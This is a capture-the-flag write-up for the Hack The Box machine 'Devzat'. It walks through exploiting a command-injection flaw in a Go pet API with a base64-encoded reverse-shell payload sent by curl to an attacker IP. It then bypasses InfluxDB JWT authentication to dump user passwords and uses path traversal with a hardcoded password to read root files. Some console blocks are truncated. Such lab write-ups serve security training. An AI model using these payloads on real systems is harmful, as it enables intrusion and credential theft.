## Summary
This box focuses a lot on enumeration and source code review. We can abuse an api to achieve remote code execiton on the target system. We can then pivot to a different user via an Authentication Bypass in the influxdb service. Source code for a development instance of the devzat chat service can then be accessed which contains a password that allows us to read any file on the system.

## Foothold
Let's start out with a doing a port scan with nmap: 
```console
# Nmap 7.92 scan initiated Tue Jan 18 17:38:37 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.164.185

As can be seen 2 ports, 22 and 8000 are hosting ssh services. Port 80 is hosting a http service. If we start out by visiting the web application hosted on port 80 we get greeted with the following:

We should also enumerate vhosts with gobuster:
```console
‚îå‚îÄ‚îÄ(bitis„âøworkstation)-[~/htb/Machines/devzat]

Adding `pets.devzat.htb` to our `/etc/hosts`{: .filepath} file, we can now visit the site:

We can now scan for directories via gobuster on the pets page (Note that we are blacklisting the 200 status code since all directories will give this status):

```

We found a .git directory. We can use the [git-dumper](https://github.com/arthaud/git-dumper) tool to download as much as possible from the directory.

```console
‚îå‚îÄ‚îÄ(bitis„âøworkstation)-[~/htb/Machines/devzat]

‚îî‚îÄ$ ls    
characteristics  go.mod  go.sum  main.go  petshop  start.sh  static
```
Reading `main.go`{: .filepath}, we discover an interesting function named `loadcharacter`:
```go
func loadCharacter(species string) string {
  cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
  stdoutStderr, err := cmd.CombinedOutput()
  if err != nil {
    return err.Error()
  }
  return string(stdoutStderr)
}
```
√åt takes a string as argument and then inserts it into a `sh` command without any sanitization. Reading on, we find the function calling this one: 
```go
func addPet(w http.ResponseWriter, r *http.Request) {
  reqBody, _ := ioutil.ReadAll(r.Body)
  var addPet Pet
  err := json.Unmarshal(reqBody, &addPet)
  if err != nil {
    e := fmt.Sprintf("There has been an error: %+v", err)
    http.Error(w, e, http.StatusBadRequest)
    return
  }

  addPet.Characteristics = loadCharacter(addPet.Species)
  Pets = append(Pets, addPet)

  w.WriteHeader(http.StatusOK)
  fmt.Fprint(w, "Pet was added successfully")
}
```
The `addPet` function calls the `loadCharacter` function. This function, in turn, is called by the `petHandler` function which handles calls to the pets API located at the `/api/pet` endpoint. To exploit this we simply need to do a post-request to this endpoint containing a json object describing a pet where the `species` field contains our injected commands. We can use curl to interact with the API: 

```console
‚îå‚îÄ‚îÄ(bitis„âøworkstation)-[~/htb/Machines/devzat/out]
‚îî‚îÄ$ curl -X POST -d '{"name": "Cicada","species": "cat; echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xODIvMTMzNyAwPiYx | base64 -d | bash", "characteristics": "cat"}' -H "'Content-Type': 'application/json'" "http://pets.devzat.htb/api/pet"
```
This gives us a reverse shell and access to the patric user.
```
‚îå‚îÄ‚îÄ(bitis„âøworkstation)-[~/htb/Machines/devzat]
‚îî‚îÄ$ nc -lvnp 1337             
listening on [any] 1337 ...

/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
$ 
```
An ssh key belonging to patric can be found in his home directory, and can be used to get a more stable shell. 

## Pivot
Listing the contents of the `/home`{: .filepath} direcotry list another user, which means w emost likely have to pivot to this user before rooting the box.
```console
atrick@devzat:/home$ ls
catherine  patrick
```
If we go back to the devzat site, we see the following:

Joining the chat as patrick lets us see his chat with the admin:
```console

admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool üëç
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat

```
As we can see, the machine is hosting an influxdb. Reading about influxdb, the default port seems to be 8086.
```console

```
As we can see port 8086 is indeed in use. Searching for vulnerabilities in influxdb returns an [Authentication bypass](https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMINFLUXDATAINFLUXDBSERVICESHTTPD-1041719)

We can create a valid jwt on <https://jwt.io> with an empty secret. 
![JWT generation through jwt.io](jwt.png)

We can then enumerate the database and dump the user table:
```console
patrick@devzat:/home$ curl -G $url --data-urlencode "db=devzat" --data-urlencode "q=SELECT * FROM \"user\"" -H "Authorization: Bearer $token"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "user",
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "values": [
                        [

                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [

                        ]
                    ]
                }
            ]
        }
    ]
}
patrick@devzat:/home$ 
```
We now have the credentials for the catherine user: `catherine:woBeeYareedahc7Oogeephies7Aiseci`. 

## Privilege escalation
After switching to the catherine user we should start trying to escalate our privileges. We once again log in to the chat service on port 8000.
```console
catherine@devzat:~$ ssh -l catherine -p 8000 localhost
The authenticity of host '[localhost]:8000 ([127.0.0.1]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:8000' (RSA) to the list of known hosts.
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now üëî
patrick: That's perfectly fine üëç  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: 
```
As we can see, there is a local dev instance of the chat service on port 8443. We can also see that we should have access to source code for the instance in our backups. Let's take a look at the `/var/backups`{: .filepath} folder, which contains a zip archive with the source code. Looking at the `commands.go`{: .filepath} file, we see the following code:
```go
func fileCommand(u *user, args []string) {
        if len(args) < 1 {
                u.system("Please provide file to print and the password")
                return
        }

        if len(args) < 2 {
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "CeilingCatStillAThingIn2021?" {
                u.system("You did provide the wrong password")
                return
        }

        // Get CWD
        cwd, err := os.Getwd()

It seemingly just prints whatever file we want into the chat. Let's take a look:
```console
devbot: catherine has joined the chat
catherine: /file
[SYSTEM] Please provide file to print and the password
catherine: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
catherine: /file ../../../../../root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 0ad7041bda0cbe6977dd05c16e25a324
catherine: 
```
We have the contents of `root.txt`{: .filepath}. Obviously we could also have printed the ssh key of the root user, however this will do. Rooted!
